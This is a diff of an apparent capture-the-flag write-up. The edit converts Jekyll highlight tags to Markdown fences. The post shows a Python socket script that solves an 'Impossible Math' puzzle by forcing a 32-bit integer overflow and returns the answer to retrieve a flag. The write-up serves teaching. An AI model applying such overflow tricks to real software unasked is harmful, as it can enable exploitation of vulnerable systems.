@@ -56,17 +56,17 @@ As a reminder, we can calculate our overflow using the formula from earlier:
 
 I turned this into a proof of concept by generating a new ncat session, which asked the following:
 
-{% highlight text %}
+```
 Solve for X, where:
 X > 37864
 X * 8 = 37864
-{% endhighlight %}
+```
 
 To generate our answer, I used the following:
 
-{% highlight python %}
+```python
 python -c 'print((2**32+destination)/multiplier)'
-{% endhighlight %}
+```
 
 This generated the answer of 536875645 as follows:
 
@@ -89,7 +89,7 @@ Splitting our variables out of the calculation is quite easy. They’re both pre
 
 We can use regular expressions to identify this packet stream from the equals sign, and then split our values out into capture groups using another expression. Putting this boilerplate together looks like the following:
 
-{% highlight python %}
+```python
 #!/usr/bin/python3
  
 import socket
@@ -135,7 +135,7 @@ if __name__ == '__main__':
    
         print('multiplier: ' + match.group(1))
         print('destination: ' + match.group(2))
-{% endhighlight %}
+```
 
 ![Impossible Math Boilerplate Execution](/images/integer-overflows/BoilerPlateExec.png)
 
@@ -145,16 +145,16 @@ Great! We now have what we need in a variable. Referring back to our formula abo
 
 This will look like the following (note that we cast our regular expressions back to integers to prevent operand exceptions):
 
-{% highlight python %}
+```python
 multiplier = int(match.group(1))
 destination = int(match.group(2))
 overflow = int((2**32+destination) / multiplier)
-{% endhighlight %}
+```
 
 # Final Script
 Putting it all together we receive the following:
 
-{% highlight python %}
+```python
 #!/usr/bin/python3
  
 import socket
@@ -204,7 +204,7 @@ if __name__ == '__main__':
         
         # encode and transfer
         client.send(str(overflow).encode('utf-8')+ b'\n')
-{% endhighlight %}
+```
 
 ![Impossible Math Flag](/images/integer-overflows/flag.png)
 
